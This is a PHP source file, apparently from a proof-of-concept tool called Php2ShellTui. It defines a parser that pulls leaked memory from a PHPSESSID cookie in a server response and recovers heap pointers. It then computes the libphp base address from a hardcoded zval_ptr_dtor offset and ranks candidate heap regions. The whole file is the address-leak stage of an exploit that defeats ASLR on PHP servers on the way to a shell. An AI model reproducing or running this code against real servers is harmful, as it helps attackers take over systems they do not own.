<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

final class LeakParser
{
    private const POINTER_MIN = 0x7f0000000000;
    private const POINTER_MAX = 0x7fffffffffff;
    private const BUCKET_MASK = 0x1FFFFF;

    /**
     * @return array{
     *     decoded: int,
     *     zval_ptr_dtor: int,
     *     libphp: int,
     *     buckets: array<int, int>,
     *     main_candidates: list<int>,
     *     candidate_counts: array<int, int>
     * }
     */
    public static function parse(string $response, int $zvalPtrDtorOffset = 0x65EB60, int $mainBucketCount = 87): array
    {
        $marker = 'Set-Cookie: PHPSESSID=';
        $position = stripos($response, $marker);

        if ($position === false) {
            throw new \RuntimeException('No Set-Cookie: PHPSESSID in the leak response.');
        }

        $value = explode("\r\n", substr($response, $position + strlen($marker)), 2)[0];
        $decoded = rawurldecode($value);
        $length = strlen($decoded);

        if ($length < 8) {
            throw new \RuntimeException('The leak cookie is too short.');
        }

        $counts = [];

        for ($offset = 0; $offset + 8 < $length; $offset += 8) {
            $pointer = unpack('P', substr($decoded, $offset, 8))[1];

            if ($pointer < self::POINTER_MIN || $pointer > self::POINTER_MAX) {
                continue;
            }

            $counts[$pointer] = ($counts[$pointer] ?? 0) + 1;
        }

        if ($counts === []) {
            throw new \RuntimeException('No heap pointers in the leak window.');
        }

        arsort($counts);
        $zvalPtrDtor = (int) array_key_first($counts);
        $libphp = $zvalPtrDtor - $zvalPtrDtorOffset;

        $buckets = [];
        foreach ($counts as $pointer => $count) {
            $bucket = $pointer & ~self::BUCKET_MASK;
            $buckets[$bucket] = ($buckets[$bucket] ?? 0) + $count;
        }

        arsort($buckets);
        $libBucket = $zvalPtrDtor & ~self::BUCKET_MASK;
        $idBucket = (int) array_key_first($buckets);

        $candidates = [];
        foreach ($buckets as $bucket => $count) {
            if ($bucket === $libBucket || $bucket === $idBucket) {
                continue;
            }

            $candidates[] = ['bucket' => $bucket, 'count' => $count];
        }

        usort($candidates, static function (array $a, array $b) use ($mainBucketCount): int {
            $distance = abs($a['count'] - $mainBucketCount) <=> abs($b['count'] - $mainBucketCount);

            return $distance !== 0 ? $distance : $a['count'] <=> $b['count'];
        });

        $top = array_slice($candidates, 0, 3);
        $mainCandidates = [];
        $candidateCounts = [];

        foreach ($top as $candidate) {
            $mainCandidates[] = $candidate['bucket'];
            $candidateCounts[$candidate['bucket']] = $candidate['count'];
        }

        return [
            'decoded' => $length,
            'zval_ptr_dtor' => $zvalPtrDtor,
            'libphp' => $libphp,
            'buckets' => $buckets,
            'main_candidates' => $mainCandidates,
            'candidate_counts' => $candidateCounts,
        ];
    }
}
